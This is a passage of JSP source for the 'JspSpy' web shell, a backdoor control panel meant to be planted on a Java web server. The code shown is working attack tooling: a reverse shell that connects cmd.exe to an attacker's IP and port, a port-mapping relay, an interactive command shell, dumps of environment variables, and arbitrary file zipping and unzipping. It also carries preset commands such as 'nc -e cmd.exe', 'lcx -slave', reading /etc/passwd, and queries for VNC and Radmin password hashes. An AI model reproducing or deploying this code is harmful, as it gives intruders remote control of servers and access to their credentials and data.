String packedFile = request.getParameter("packedfile");
if (Util.isEmpty(packedFile))
return;
String saveFileName = request.getParameter("savefilename");
File saveF = new File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);
if (saveF.exists()) {
JSession.setAttribute(MSG,"The File \""+saveFileName+"\" Has Been Exists!");
response.sendRedirect(SHELL_NAME+"?o=index");
return;
}
File pF = new File(packedFile);
ZipOutputStream zout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(saveF)));
String base = "";
if (pF.isDirectory()) {
zipDir(pF,base,zout);
} else {
zipFile(pF,base,zout);
}
zout.close();
JSession.setAttribute(MSG,"Pack File Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e;
}
}
public void zipDir(File f,String base,ZipOutputStream zout)  throws Exception {
if (f.isDirectory()) {
File[] arr = f.listFiles();
for (File ff:arr) {
String tmpBase = base;
if (!Util.isEmpty(tmpBase) && !tmpBase.endsWith("/"))
tmpBase += "/";
zipDir(ff,tmpBase+f.getName(),zout);
}
} else {
String tmpBase = base;
if (!Util.isEmpty(tmpBase) &&!tmpBase.endsWith("/"))
tmpBase += "/";
zipFile(f,tmpBase,zout);
}
}
public void zipFile(File f,String base,ZipOutputStream zout) throws Exception{
ZipEntry entry = new ZipEntry(base+f.getName());
zout.putNextEntry(entry);
FileInputStream fInput = new FileInputStream(f);
int len = 0;
byte[] buf = new byte[1024];
while ((len = fInput.read(buf)) != -1) {
zout.write(buf, 0, len);
zout.flush();
}
fInput.close();
}
}
private static class UnPackInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String savepath = request.getParameter("savepath");
String zipfile = request.getParameter("zipfile");
if (Util.isEmpty(savepath) || Util.isEmpty(zipfile))
return;
File save = new File(savepath);
save.mkdirs();
ZipFile file = new ZipFile(new File(zipfile));   
Enumeration e = file.entries();   
while (e.hasMoreElements()) {   
ZipEntry en = (ZipEntry) e.nextElement(); 
String entryPath = en.getName();
int index = entryPath.lastIndexOf("/");
if (index != -1)
entryPath = entryPath.substring(0,index);
File absEntryFile = new File(save,entryPath);
if (!absEntryFile.exists() && (en.isDirectory() || en.getName().indexOf("/") != -1)) 
absEntryFile.mkdirs();
BufferedOutputStream output = null;
BufferedInputStream input = null;
try {
output = new BufferedOutputStream(   
new FileOutputStream(new File(save,en.getName())));   
input = new BufferedInputStream(   
file.getInputStream(en));   
byte[] b = new byte[1024];   
int len = input.read(b);   
while (len != -1) {   
output.write(b, 0, len);   
len = input.read(b);   
}   
} catch (Exception ex) {
} finally {
try {
if (output != null)
output.close();
if (input != null)
input.close();
} catch (Exception ex1) {
}
}
}
file.close();
JSession.setAttribute(MSG,"Unzip File Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//VMapPort
private static class VmpInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
Object localIP = JSession.getAttribute("localIP");
Object localPort = JSession.getAttribute("localPort");
Object remoteIP = JSession.getAttribute("remoteIP");
Object remotePort = JSession.getAttribute("remotePort");
Object done = JSession.getAttribute("done");
JSession.removeAttribute("localIP");
JSession.removeAttribute("localPort");
JSession.removeAttribute("remoteIP");
JSession.removeAttribute("remotePort");
JSession.removeAttribute("done");
if (Util.isEmpty(localIP))
localIP = InetAddress.getLocalHost().getHostAddress();
if (Util.isEmpty(localPort))
localPort = "3389";
if (Util.isEmpty(remoteIP))
remoteIP = "www.forjj.com";
if (Util.isEmpty(remotePort))
remotePort = "80";
if (!Util.isEmpty(done))
Util.outMsg(out,done.toString());
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<input type=\"hidden\" name=\"o\" value=\"mapPort\">"+
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2 id=\"Bin_H2_Title\">PortMap &gt;&gt;</h2>"+
"      <div id=\"hOWTm\">"+
"      <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"      <tr align=\"center\">"+
"        <td style=\"width:5%\"></td>"+
"        <td style=\"width:20%\" align=\"left\">Local Ip :"+
"          <input name=\"localIP\" id=\"localIP\" type=\"text\" class=\"input\" size=\"20\" value=\""+localIP+"\" />"+
"          </td>"+
"        <td style=\"width:20%\" align=\"left\">Local Port :"+
"          <input name=\"localPort\" id=\"localPort\" type=\"text\" class=\"input\" size=\"20\" value=\""+localPort+"\" /></td>"+
"        <td style=\"width:20%\" align=\"left\">Remote Ip :"+
"          <input name=\"remoteIP\" id=\"remoteIP\" type=\"text\" class=\"input\" size=\"20\" value=\""+remoteIP+"\" /></td>"+
"        <td style=\"width:20%\" align=\"left\">Remote Port :"+
"          <input name=\"remotePort\" id=\"remotePort\" type=\"text\" class=\"input\" size=\"20\" value=\""+remotePort+"\" /></td>"+
"      </tr>"+
"      <tr align=\"center\">"+
"        <td colspan=\"5\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"MapPort\" id=\"FJE\" class=\"bt\" />"+
"			<input type=\"button\" name=\"giX\" value=\"ClearAll\" id=\"giX\" onClick=\"location.href='"+SHELL_NAME+"?o=smp'\" class=\"bt\" />"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
"</td>"+
"</tr>"+
"</table>"+
"</form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//StopMapPort
private static class SmpInvoker extends DefaultInvoker {
public boolean doAfter(){return true;}
public boolean doBefore(){return true;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
Object obj = JSession.getAttribute(PORT_MAP);
if (obj != null) {
ServerSocket server = (ServerSocket)JSession.getAttribute(PORT_MAP);
server.close();
}
JSession.setAttribute("done","Stop Success!");
ins.get("vmp").invoke(request,response,JSession);
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class MapPortInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String localIP = request.getParameter("localIP");
String localPort = request.getParameter("localPort");
final String remoteIP = request.getParameter("remoteIP");
final String remotePort = request.getParameter("remotePort");
if (Util.isEmpty(localIP) || Util.isEmpty(localPort) || Util.isEmpty(remoteIP) || Util.isEmpty(remotePort))
return;
Object obj = JSession.getAttribute(PORT_MAP);
if (obj != null) {
ServerSocket s = (ServerSocket)obj;
s.close();
}
final ServerSocket server = new ServerSocket();
server.bind(new InetSocketAddress(localIP,Integer.parseInt(localPort)));
JSession.setAttribute(PORT_MAP,server);
new Thread(new Runnable(){
public void run(){
while (true) {
Socket soc = null;
Socket remoteSoc = null;
DataInputStream remoteIn = null;
DataOutputStream remoteOut = null;
DataInputStream localIn = null;
DataOutputStream localOut = null;
try{
soc = server.accept();
remoteSoc = new Socket();
remoteSoc.connect(new InetSocketAddress(remoteIP,Integer.parseInt(remotePort)));
remoteIn = new DataInputStream(remoteSoc.getInputStream());
remoteOut = new DataOutputStream(remoteSoc.getOutputStream());
localIn = new DataInputStream(soc.getInputStream());
localOut = new DataOutputStream(soc.getOutputStream());
this.readFromLocal(localIn,remoteOut);
this.readFromRemote(soc,remoteSoc,remoteIn,localOut);
}catch(Exception ex)
{								
break;
}
}
}
public void readFromLocal(final DataInputStream localIn,final DataOutputStream remoteOut){
new Thread(new Runnable(){
public void run(){
while (true) {
try{
byte[] data = new byte[100];
int len = localIn.read(data);
while (len != -1) {
remoteOut.write(data,0,len);
len = localIn.read(data);
}
}catch (Exception e) {
break;
}
}
}
}).start();
}
public void readFromRemote(final Socket soc,final Socket remoteSoc,final DataInputStream remoteIn,final DataOutputStream localOut){
new Thread(new Runnable(){
public void run(){
while(true) {
try{
byte[] data = new byte[100];
int len = remoteIn.read(data);
while (len != -1) {
localOut.write(data,0,len);
len = remoteIn.read(data);
}
}catch (Exception e) {
try{
soc.close();
remoteSoc.close();
}catch(Exception ex) {
}
break;
}
}
}
}).start();
}
}).start();
JSession.setAttribute("done","Map Port Success!");
JSession.setAttribute("localIP",localIP);
JSession.setAttribute("localPort",localPort);
JSession.setAttribute("remoteIP",remoteIP);
JSession.setAttribute("remotePort",remotePort);
response.sendRedirect(SHELL_NAME+"?o=vmp");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//VBackConnect
private static class VbcInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
Object ip = JSession.getAttribute("ip");
Object port = JSession.getAttribute("port");
Object program = JSession.getAttribute("program");
Object done = JSession.getAttribute("done");
JSession.removeAttribute("ip");
JSession.removeAttribute("port");
JSession.removeAttribute("program");
JSession.removeAttribute("done");
if (Util.isEmpty(ip))
ip = request.getRemoteAddr();
if (Util.isEmpty(port) || !Util.isInteger(port.toString()))
port = "4444";
if (Util.isEmpty(program))
program = "cmd.exe";
if (!Util.isEmpty(done))
Util.outMsg(out,done.toString());
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<input type=\"hidden\" name=\"o\" value=\"backConnect\">"+
"  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td><h2 id=\"Bin_H2_Title\">Back Connect &gt;&gt;</h2>"+
"      <div id=\"hOWTm\">"+
"      <table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"      <tr align=\"center\">"+
"        <td style=\"width:5%\"></td>"+
"        <td  align=\"center\">Your Ip :"+
"          <input name=\"ip\" id=\"ip\" type=\"text\" class=\"input\" size=\"20\" value=\""+ip+"\" />"+
"          Your Port :"+
"          <input name=\"port\" id=\"port\" type=\"text\" class=\"input\" size=\"20\" value=\""+port+"\" />Program To Back :"+
"          <input name=\"program\" id=\"program\" type=\"text\" value=\""+program+"\" class=\"input\" size=\"20\" value=\"d\" /></td>"+
"      </tr>"+
"      <tr align=\"center\">"+
"        <td colspan=\"2\"><br/>"+
"          <input type=\"submit\" name=\"FJE\" value=\"Connect\" id=\"FJE\" class=\"bt\" />"+
"    </td>"+
"    </tr>"+
"	</table>"+
"    </div>"+
"</td>"+
"</tr>"+
"</table>"+
"</form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class BackConnectInvoker extends DefaultInvoker {
public boolean doAfter(){return false;}
public boolean doBefore(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String ip = request.getParameter("ip");
String port = request.getParameter("port");
String program = request.getParameter("program");
if (Util.isEmpty(ip) || Util.isEmpty(program) || !Util.isInteger(port))
return;
Socket socket = new Socket(ip,Integer.parseInt(port));
Process process = Runtime.getRuntime().exec(program);
(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
JSession.setAttribute("done","Back Connect Success!");
JSession.setAttribute("ip",ip);
JSession.setAttribute("port",port);
JSession.setAttribute("program",program);
response.sendRedirect(SHELL_NAME+"?o=vbc");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class JspEnvInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"      <tr>"+
"        <td><h2 id=\"Ninty_H2_Title\">System Properties &gt;&gt;</h2>"+
"          <div id=\"ghaB\">"+
"            <hr style=\" border: 1px solid #ddd;height:0px;\"/>"+
"            <ul id=\"Ninty_Ul_Sys\" class=\"info\">");
Properties pro = System.getProperties();
Enumeration names = pro.propertyNames();
while (names.hasMoreElements()){
String name = (String)names.nextElement();
out.println("<li><u>"+Util.htmlEncode(name)+" : </u>"+Util.htmlEncode(pro.getProperty(name))+"</li>");
}
out.println("</ul><h2 id=\"Ninty_H2_Mac\">System Environment &gt;&gt;</h2><hr style=\" border: 1px solid #ddd;height:0px;\"/><ul id=\"Ninty_Ul_Sys\" class=\"info\">");
Map<String,String> envs = System.getenv();
Set<Map.Entry<String,String>> entrySet = envs.entrySet();
for (Map.Entry<String,String> en:entrySet) {
out.println("<li><u>"+Util.htmlEncode(en.getKey())+" : </u>"+Util.htmlEncode(en.getValue())+"</li>");
}
out.println("</ul></div></td>"+
"      </tr>"+
"    </table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class TopInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" name=\"doForm\"></form>"+
"<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"+
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\"><a href=\"http://www.forjj.com\" target=\"_blank\">JspSpy Ver: 2009</a></span>"+request.getHeader("host")+" ("+InetAddress.getLocalHost().getHostAddress()+")</td>"+
"	</tr>"+
"	<tr class=\"alt1\">"+
"		<td><a href=\"javascript:doPost({o:'logout'});\">Logout</a> | "+
"			<a href=\"javascript:doPost({o:'fileList'});\">File Manager</a> | "+
"			<a href=\"javascript:doPost({o:'vConn'});\">DataBase Manager</a> | "+
"			<a href=\"javascript:doPost({o:'vs'});\">Execute Command</a> | "+
"			<a href=\"javascript:doPost({o:'vso'});\">Shell OnLine</a> | "+
"			<a href=\"javascript:doPost({o:'vbc'});\">Back Connect</a> | "+
"			<a href=\"javascript:doPost({o:'vPortScan'});;\">Port Scan</a> | "+
"			<a href=\"javascript:doPost({o:'vd'});\">Download Remote File</a> | "+
"			<a href=\"javascript:;doPost({o:'clipboard'});\">ClipBoard</a> | "+
"			<a href=\"javascript:doPost({o:'vRemoteControl'});\">Remote Control</a> | "+
"			<a href=\"javascript:doPost({o:'vmp'});\">Port Map</a> | "+
"			<a href=\"javascript:doPost({o:'jspEnv'});\">JSP Env</a> "+
"	</tr>"+
"</table>");
if (JSession.getAttribute(MSG) != null) {
Util.outMsg(out,JSession.getAttribute(MSG).toString());
JSession.removeAttribute(MSG);
} 
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VOnLineShellInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<script>"+
"				function $(id) {"+
"					return document.getElementById(id);"+
"				}"+
"				var ie = window.navigator.userAgent.toLowerCase().indexOf(\"msie\") != -1;"+
"				window.onload = function(){"+
"					setInterval(function(){"+
"						if ($(\"autoscroll\").checked)"+
"						{"+
"							var f = window.frames[\"echo\"];"+
"							if (f && f.document && f.document.body)"+
"							{"+
"								if (!ie)"+
"								{"+
"									if (f.document.body.offsetHeight)"+
"									{"+
"										f.scrollTo(0,parseInt(f.document.body.offsetHeight)+1);"+
"									}"+
"								} else {"+
"									f.scrollTo(0,parseInt(f.document.body.scrollHeight)+1);"+
"								}"+
"							}"+
"						}"+
"					},500);"+
"				}"+
"			</script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"  <tr>"+
"    <td>");
out.println("<h2>Shell OnLine &raquo;</h2><br/>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" target=\"echo\" onsubmit=\"$('cmd').focus()\">"+
"			<input type=\"submit\" value=\" start \" class=\"bt\">"+
"				<input type=\"text\" name=\"exe\" style=\"width:300px\" class=\"input\" value=\"c:\\windows\\system32\\cmd.exe\"/>"+
"				<input type=\"hidden\" name=\"o\" value=\"online\"/><input type=\"hidden\" name=\"type\" value=\"start\"/><span class=\"tip\">Notice ! If You Are Using IE , You Must Input A Command First After You Start Or You Will Not See The Echo</span>"+
"			</form>"+
"			<hr/>"+
"				<iframe class=\"secho\" name=\"echo\" src=\"\">"+
"				</iframe>"+
"				<form action=\""+SHELL_NAME+"\" method=\"post\" onsubmit=\"this.submit();$('cmd').value='';return false;\" target=\"asyn\">"+
"					<input type=\"text\" id=\"cmd\" name=\"cmd\" class=\"input\" style=\"width:80%\">"+
"					<input name=\"o\" id=\"o\" type=\"hidden\" value=\"online\"/><input type=\"hidden\" id=\"ddtype\" name=\"type\" value=\"ecmd\"/>"+
"					<select onchange=\"$('cmd').value = this.value;$('cmd').focus()\">"+
"						<option value=\"\" selected> </option>"+
"						<option value=\"uname -a\">uname -a</option>"+
"						<option value=\"cat /etc/issue\">issue</option>"+
"						<option value=\"cat /etc/passwd\">passwd</option>"+
"						<option value=\"netstat -an\">netstat -an</option>"+
"						<option value=\"net user\">net user</option>"+
"						<option value=\"tasklist\">tasklist</option>"+
"						<option value=\"tasklist /svc\">tasklist /svc</option>"+
"						<option value=\"net start\">net start</option>"+
"						<option value=\"net stop policyagent /yes\">net stop</option>"+
"						<option value=\"nbtstat -A IP\">nbtstat -A</option>"+
"						<option value='reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"PortNumber\"'>reg query</option>"+
"						<option value='reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\\" /v \"Parameter\"'>radmin hash</option>"+
"						<option value='reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4\" /v \"password\"'>vnc hash</option>"+
"						<option value=\"nc -e cmd.exe 192.168.230.1 4444\">nc</option>"+
"						<option value=\"lcx -slave 192.168.230.1 4444 127.0.0.1 3389\">lcx</option>"+
"						<option value=\"systeminfo\">systeminfo</option>"+
"						<option value=\"net localgroup\">view groups</option>"+
"						<option value=\"net localgroup administrators\">view admins</option>"+
"					</select>"+
"					<input type=\"checkbox\" checked=\"checked\" id=\"autoscroll\">Auto Scroll"+
"					<input type=\"button\" value=\"Stop\" class=\"bt\" onclick=\"$('ddtype').value='stop';this.form.submit()\">"+
"				</form>"+
"			<iframe style=\"display:none\" name=\"asyn\"></iframe>"
);
out.println("    </td>"+
"  </tr>"+
"</table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class OnLineInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String type = request.getParameter("type");
if (Util.isEmpty(type))
return;
if (type.toLowerCase().equals("start")) {
String exe = request.getParameter("exe");
if (Util.isEmpty(exe))
return;
Process pro = Runtime.getRuntime().exec(exe);
ByteArrayOutputStream outs = new ByteArrayOutputStream();
response.setContentLength(100000000);
response.setContentType("text/html;charset="+Charset.defaultCharset().name());
OnLineProcess olp = new OnLineProcess(pro);
JSession.setAttribute(SHELL_ONLINE,olp);
new OnLineConnector(new ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),"exeOclientR",olp).start();
new OnLineConnector(pro.getInputStream(),response.getOutputStream(),"exeRclientO",olp).start();
new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//´íÎóÐÅÏ¢Á÷¡£
Thread.sleep(1000 * 60 * 60 * 24);
} else if (type.equals("ecmd")) {
Object o = JSession.getAttribute(SHELL_ONLINE);
String cmd = request.getParameter("cmd");
if (Util.isEmpty(cmd))
return;
if (o == null)
return;
OnLineProcess olp = (OnLineProcess)o;
olp.setCmd(cmd);
} else {
Object o = JSession.getAttribute(SHELL_ONLINE);
if (o == null)
return;
OnLineProcess olp = (OnLineProcess)o;
olp.stop();
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}

static{
ins.put("script",new ScriptInvoker());
ins.put("before",new BeforeInvoker());
ins.put("after",new AfterInvoker());
ins.put("deleteBatch",new DeleteBatchInvoker());
ins.put("clipboard",new ClipBoardInvoker());
ins.put("vRemoteControl",new VRemoteControlInvoker());
ins.put("gc",new GcInvoker());
ins.put("vPortScan",new VPortScanInvoker());
ins.put("portScan",new PortScanInvoker());
ins.put("vConn",new VConnInvoker());
ins.put("dbc",new DbcInvoker());
ins.put("executesql",new ExecuteSQLInvoker());
ins.put("vLogin",new VLoginInvoker());
ins.put("login",new LoginInvoker());
ins.put("filelist", new FileListInvoker());
ins.put("logout",new LogoutInvoker());
ins.put("upload",new UploadInvoker());
ins.put("copy",new CopyInvoker());
ins.put("bottom",new BottomInvoker());
ins.put("vCreateFile",new VCreateFileInvoker());
ins.put("vEdit",new VEditInvoker());
ins.put("createFile",new CreateFileInvoker());
ins.put("vEditProperty",new VEditPropertyInvoker());
ins.put("editProperty",new EditPropertyInvoker());
ins.put("vs",new VsInvoker());
ins.put("shell",new ShellInvoker());
ins.put("down",new DownInvoker());
ins.put("vd",new VdInvoker());
ins.put("downRemote",new DownRemoteInvoker());
ins.put("index",new IndexInvoker());
ins.put("mkdir",new MkDirInvoker());
ins.put("move",new MoveInvoker());
ins.put("removedir",new RemoteDirInvoker());
ins.put("packBatch",new PackBatchInvoker());
ins.put("pack",new PackInvoker());
ins.put("unpack",new UnPackInvoker());
ins.put("vmp",new VmpInvoker());
ins.put("vbc",new VbcInvoker());
ins.put("backConnect",new BackConnectInvoker());
ins.put("jspEnv",new JspEnvInvoker());
ins.put("smp",new SmpInvoker());
ins.put("mapPort",new MapPortInvoker());
ins.put("top",new TopInvoker());
ins.put("vso",new VOnLineShellInvoker());
ins.put("online",new OnLineInvoker());
}
%>
<%
try {
String o = request.getParameter("o");
if (!Util.isEmpty(o)) {
Invoker in = ins.get(o);
if (in == null) {
response.sendRedirect(SHELL_NAME+"?o=index");
} else {
if (in.doBefore()) {
String path = request.getParameter("folder");
if (!Util.isEmpty(path))
session.setAttribute(CURRENT_DIR,path);
ins.get("before").invoke(request,response,session);
ins.get("script").invoke(request,response,session);
ins.get("top").invoke(request,response,session);
}
in.invoke(request,response,session);
if (!in.doAfter()) {
return;
}else{
ins.get("bottom").invoke(request,response,session);
ins.get("after").invoke(request,response,session);
}
}
} else {
response.sendRedirect(SHELL_NAME+"?o=index");
}					
} catch (Exception e) {
ByteArrayOutputStream bout = new ByteArrayOutputStream();
e.printStackTrace(new PrintStream(bout));
session.setAttribute(CURRENT_DIR,SHELL_DIR);
Util.outMsg(out,Util.htmlEncode(new String(bout.toByteArray())).replace("\n","<br/>"),"left");
bout.close();
out.flush();
ins.get("bottom").invoke(request,response,session);
ins.get("after").invoke(request,response,session);
}
%>
